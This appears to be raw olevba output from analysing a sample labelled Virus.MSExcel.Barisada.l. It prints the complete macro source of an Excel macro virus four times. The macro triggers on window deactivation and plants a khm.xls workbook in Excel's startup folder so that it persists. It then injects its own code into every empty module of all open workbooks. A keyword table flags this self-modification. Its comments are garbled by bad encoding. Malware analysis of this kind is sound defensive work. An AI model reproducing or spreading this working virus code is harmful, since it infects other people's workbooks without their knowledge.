olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada.l-0d2bb7957b5bf841b455fa1f9c5f90299a057be9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Barisada.l-0d2bb7957b5bf841b455fa1f9c5f90299a057be9 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
'xlstartЖъґЃEStartupPath)їЎ "
khm.xls "°Ў ѕшАёёЃE»х·О ёёµзґЩ."
 myfile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs Filename:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook ComponentїЎ ДЪµе°Ў АЦАёёЃEvcodeєЇјцїЎ ДЪµеё¦ АъАЃE
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'ДЪµе°Ў ѕшґВ Componentё¦ ГЈѕЖј­ vcodeєЇјц°ЄА» АФ·В
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Barisada.l-0d2bb7957b5bf841b455fa1f9c5f90299a057be9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
'xlstartЖъґЃEStartupPath)їЎ "
khm.xls "°Ў ѕшАёёЃE»х·О ёёµзґЩ."
 myfile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs Filename:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook ComponentїЎ ДЪµе°Ў АЦАёёЃEvcodeєЇјцїЎ ДЪµеё¦ АъАЃE
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'ДЪµе°Ў ѕшґВ Componentё¦ ГЈѕЖј­ vcodeєЇјц°ЄА» АФ·В
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Barisada.l-0d2bb7957b5bf841b455fa1f9c5f90299a057be9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
'xlstartЖъґЃEStartupPath)їЎ "
khm.xls "°Ў ѕшАёёЃE»х·О ёёµзґЩ."
 myfile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs Filename:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook ComponentїЎ ДЪµе°Ў АЦАёёЃEvcodeєЇјцїЎ ДЪµеё¦ АъАЃE
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'ДЪµе°Ў ѕшґВ Componentё¦ ГЈѕЖј­ vcodeєЇјц°ЄА» АФ·В
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Barisada.l-0d2bb7957b5bf841b455fa1f9c5f90299a057be9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
'xlstartЖъґЃEStartupPath)їЎ "
khm.xls "°Ў ѕшАёёЃE»х·О ёёµзґЩ."
 myfile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs Filename:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook ComponentїЎ ДЪµе°Ў АЦАёёЃEvcodeєЇјцїЎ ДЪµеё¦ АъАЃE
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'ДЪµе°Ў ѕшґВ Componentё¦ ГЈѕЖј­ vcodeєЇјц°ЄА» АФ·В
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

